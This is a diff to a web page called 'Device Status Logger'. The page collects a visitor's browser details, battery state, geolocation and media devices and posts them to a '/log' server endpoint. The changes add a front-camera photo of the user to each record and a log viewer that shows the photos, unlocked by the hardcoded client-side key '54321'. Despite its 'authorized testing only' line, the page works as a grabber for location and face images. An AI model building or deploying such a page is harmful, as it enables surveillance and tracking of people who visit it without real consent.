@@ -22,6 +22,7 @@ body{
   width:100%;
   height:100%;
   z-index:0;
+  pointer-events:none;
 }
 
 /* Center Container */
@@ -31,12 +32,13 @@ body{
   display:flex;
   flex-direction:column;
   align-items:center;
-  justify-content:center;
+  justify-content:flex-start;
+  padding-top:40px;
   height:100%;
   text-align:center;
 }
 
-/* Neon animated border glow */
+/* Neon animation */
 @keyframes neon {
   0% {box-shadow:0 0 10px #00f0ff, 0 0 20px #00f0ff,0 0 30px #00f0ff;}
   33% {box-shadow:0 0 10px #ff005c,0 0 20px #ff005c,0 0 30px #ff005c;}
@@ -59,6 +61,7 @@ button{
 }
 button:hover{transform:scale(1.05);}
 
+/* Logs & Photos */
 #logSection{
   display:none;
   background:rgba(0,0,0,0.6);
@@ -66,13 +69,31 @@ button:hover{transform:scale(1.05);}
   border-radius:12px;
   padding:16px;
   margin-top:20px;
-  max-width:800px;
+  max-width:900px;
   width:90%;
-  height:400px;
+  max-height:60%;
   overflow:auto;
-  text-align:left;
-  white-space:pre-wrap;
+}
+
+.logEntry{
+  display:flex;
+  flex-direction:row;
+  gap:20px;
+  border-bottom:1px solid rgba(0,255,255,0.2);
+  padding:10px 0;
+}
+
+.logInfo{
+  flex:1;
   font-size:13px;
+  white-space:pre-wrap;
+  overflow-x:auto;
+}
+
+.logPhoto img{
+  max-width:150px;
+  border-radius:8px;
+  box-shadow:0 0 10px #0ff;
 }
 </style>
 </head>
@@ -81,7 +102,9 @@ button:hover{transform:scale(1.05);}
 
 <div class="main">
   <h2>Device Status Logger</h2>
-  <p style="max-width:600px;color:#bcd;text-shadow:0 0 5px #000">Collects and logs full device status (for your own authorized testing only).</p>
+  <p style="max-width:600px;color:#bcd;text-shadow:0 0 5px #000">
+    Collects and logs full device status (for your own authorized testing only).
+  </p>
 
   <div>
     <button id="collectLocal">Collect Locally</button>
@@ -89,29 +112,31 @@ button:hover{transform:scale(1.05);}
     <button id="showLogs">View Logs</button>
   </div>
 
-  <div id="logSection"><pre id="logOutput"></pre></div>
+  <div id="logSection"></div>
 </div>
 
 <script>
-// Simple water ripple effect
+// ---------------- Ripple Animation ----------------
 const canvas = document.getElementById('rippleCanvas');
 const ctx = canvas.getContext('2d');
 let ripples=[];
-function resize(){canvas.width=innerWidth;canvas.height=innerHeight;}
-window.addEventListener('resize',resize);resize();
+
+function resize(){ canvas.width = innerWidth; canvas.height = innerHeight; }
+window.addEventListener('resize', resize);
+resize();
 
 function draw(){
   ctx.clearRect(0,0,canvas.width,canvas.height);
   ripples.forEach(r=>{
-    r.radius+=1.5;
-    r.alpha-=0.01;
+    r.radius += 1.5;
+    r.alpha -= 0.01;
     ctx.beginPath();
     ctx.arc(r.x,r.y,r.radius,0,Math.PI*2);
-    ctx.strokeStyle=`rgba(${r.color},${r.alpha})`;
-    ctx.lineWidth=2;
+    ctx.strokeStyle = `rgba(${r.color},${r.alpha})`;
+    ctx.lineWidth = 2;
     ctx.stroke();
   });
-  ripples=ripples.filter(r=>r.alpha>0);
+  ripples = ripples.filter(r=>r.alpha>0);
   requestAnimationFrame(draw);
 }
 draw();
@@ -120,12 +145,28 @@ function ripple(x,y){
   const colors=["0,255,255","255,0,90","0,255,100"];
   ripples.push({x,y,radius:0,alpha:0.7,color:colors[Math.floor(Math.random()*colors.length)]});
 }
-canvas.addEventListener('pointerdown',e=>ripple(e.clientX,e.clientY));
+document.addEventListener('pointerdown', e => ripple(e.clientX,e.clientY));
 
-// --------------- DEVICE INFO ---------------
+// ---------------- Front Camera Capture ----------------
+async function captureFrontPhoto(){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    const photoBlob = await imageCapture.takePhoto();
+    track.stop();
+    const reader = new FileReader();
+    reader.readAsDataURL(photoBlob);
+    return await new Promise(resolve=>{
+      reader.onloadend = ()=>resolve(reader.result);
+    });
+  }catch(err){ console.warn("Camera capture failed:", err); return null; }
+}
+
+// ---------------- Device Info ----------------
 async function gatherInfo(){
-  const nav=navigator;
-  const info={
+  const nav = navigator;
+  const info = {
     time:new Date().toISOString(),
     userAgent:nav.userAgent,
     platform:nav.platform,
@@ -135,52 +176,80 @@ async function gatherInfo(){
     screen:{width:screen.width,height:screen.height,availWidth:screen.availWidth,availHeight:screen.availHeight,colorDepth:screen.colorDepth},
     viewport:{width:innerWidth,height:innerHeight},
     timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
-    connection:nav.connection?{
-      type:nav.connection.effectiveType,
-      downlink:nav.connection.downlink,
-      rtt:nav.connection.rtt
-    }:null
+    connection: nav.connection?{type:nav.connection.effectiveType,downlink:nav.connection.downlink,rtt:nav.connection.rtt}:null
   };
-  // Battery
-  if(nav.getBattery){try{const b=await nav.getBattery();info.battery={level:b.level,charging:b.charging}}catch{}}
-  // Geo
-  info.geolocation=await new Promise(r=>{
-    if(!nav.geolocation)return r(null);
+
+  if(nav.getBattery){try{const b=await nav.getBattery();info.battery={level:b.level,charging:b.charging};}catch{}}
+
+  info.geolocation = await new Promise(r=>{
+    if(!nav.geolocation) return r(null);
     nav.geolocation.getCurrentPosition(
       pos=>r({lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy}),
       err=>r({error:err.message}),
-      {timeout:8000});
+      {timeout:8000}
+    );
   });
-  // Media devices
+
   try{
     await nav.mediaDevices.getUserMedia({audio:true,video:true});
-    const dev=await nav.mediaDevices.enumerateDevices();
-    info.mediaDevices=dev.map(d=>({kind:d.kind,label:d.label}));
-  }catch(e){info.mediaDevices=[{error:e.message}]}
+    const dev = await nav.mediaDevices.enumerateDevices();
+    info.mediaDevices = dev.map(d=>({kind:d.kind,label:d.label}));
+  }catch(e){ info.mediaDevices=[{error:e.message}]; }
+
+  const photoData = await captureFrontPhoto();
+  if(photoData) info.photo = photoData;
+
   return info;
 }
 
-document.getElementById('collectLocal').onclick=async()=>{
-  const data=await gatherInfo();
+// ---------------- Button Handlers ----------------
+document.getElementById('collectLocal').onclick = async ()=>{
+  const data = await gatherInfo();
   alert("Device info collected locally.");
   console.log(data);
 };
-document.getElementById('collectSend').onclick=async()=>{
-  const data=await gatherInfo();
-  await fetch("/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
-  alert("Device info sent to server.");
+
+document.getElementById('collectSend').onclick = async ()=>{
+  const data = await gatherInfo();
+  try{
+    await fetch("/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)});
+    alert("Device info sent to server.");
+  }catch(e){console.error(e); alert("Failed to send.");}
 };
 
-// ----- View Logs -----
-document.getElementById('showLogs').onclick=async()=>{
-  const key=prompt("Enter access key:");
-  if(key!=="54321"){alert("Wrong key.");return;}
-  const res=await fetch("/view?key="+key);
-  if(!res.ok){alert("Access denied.");return;}
-  const logs=await res.json();
-  const out=document.getElementById('logOutput');
-  out.textContent=JSON.stringify(logs,null,2);
-  document.getElementById('logSection').style.display='block';
+document.getElementById('showLogs').onclick = async ()=>{
+  const key = prompt("Enter access key:");
+  if(key !== "54321"){ alert("Wrong key."); return; }
+  try{
+    const res = await fetch("/view?key="+encodeURIComponent(key));
+    if(!res.ok){ alert("Access denied."); return; }
+    const logs = await res.json();
+    const logSection = document.getElementById('logSection');
+    logSection.innerHTML = "";
+    logs.forEach(log=>{
+      const entry = document.createElement('div');
+      entry.className = 'logEntry';
+
+      const infoDiv = document.createElement('div');
+      infoDiv.className = 'logInfo';
+      const copy = {...log};
+      if(copy.photo) delete copy.photo;
+      infoDiv.textContent = JSON.stringify(copy,null,2);
+
+      const photoDiv = document.createElement('div');
+      photoDiv.className = 'logPhoto';
+      if(log.photo){
+        const img = document.createElement('img');
+        img.src = log.photo;
+        photoDiv.appendChild(img);
+      }
+
+      entry.appendChild(infoDiv);
+      entry.appendChild(photoDiv);
+      logSection.appendChild(entry);
+    });
+    logSection.style.display = 'block';
+  }catch(e){ console.error(e); alert("Failed to fetch logs.");}
 };
 </script>
 </body>
